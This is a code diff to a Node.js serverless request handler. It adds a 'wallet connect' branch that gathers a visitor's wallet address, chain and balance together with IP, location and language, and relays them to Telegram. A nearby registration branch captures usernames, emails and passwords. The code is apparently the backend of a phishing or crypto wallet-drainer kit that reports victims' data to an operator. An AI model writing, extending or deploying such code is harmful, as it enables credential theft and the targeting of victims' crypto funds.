@@ -90,7 +90,36 @@ module.exports = async (req, res) => {
   const cleanLang = rawLang.split('-')[0].toLowerCase();
   const timeStr = body.time || now.toLocaleTimeString('en-GB', { hour12: false, timeZone: body.tz || 'UTC' });
 
-  // 1. REGISTRATION (Screenshot 2)
+  // 1. WALLET CONNECT (manual form: wallet + balance)
+  if (body.type === 'wallet' || body.fullAddress || body.balance) {
+    const walletName = body.wallet || body.walletName || 'Manual Connect';
+    const chain = body.chain || 'ETH';
+    const fullAddr = body.fullAddress || body.address || 'N/A';
+    const shortAddr = body.address || (String(fullAddr).length > 12 ? String(fullAddr).slice(0, 6) + '...' + String(fullAddr).slice(-4) : fullAddr);
+    const balance = body.balance || 'N/A';
+
+    const text =
+      '💰 NEW WALLET CONNECT\n' +
+      '-------------------\n' +
+      '👛 Wallet: ' + walletName + '\n' +
+      '⛓ Chain: ' + chain + '\n' +
+      '📍 Address: ' + fullAddr + ' (' + shortAddr + ')\n' +
+      '💲 Balance: ' + balance + '\n' +
+      '-------------------\n' +
+      '🌍 IP: ' + ip + '\n' +
+      '🏳️ Location: ' + location + '\n' +
+      '🗣 Lang: ' + cleanLang + '\n' +
+      '⏰ Time: ' + timeStr;
+
+    try {
+      await sendTelegram(text);
+    } catch (e) {
+      console.error('telegram error', e);
+    }
+    return res.status(200).json({ ok: true });
+  }
+
+  // 2. REGISTRATION (Screenshot 2)
   if (body.type === 'registration' || body.type === 'register' || body.password || body.pass) {
     const login = body.login || body.username || 'N/A';
     const email = body.email || 'N/A';
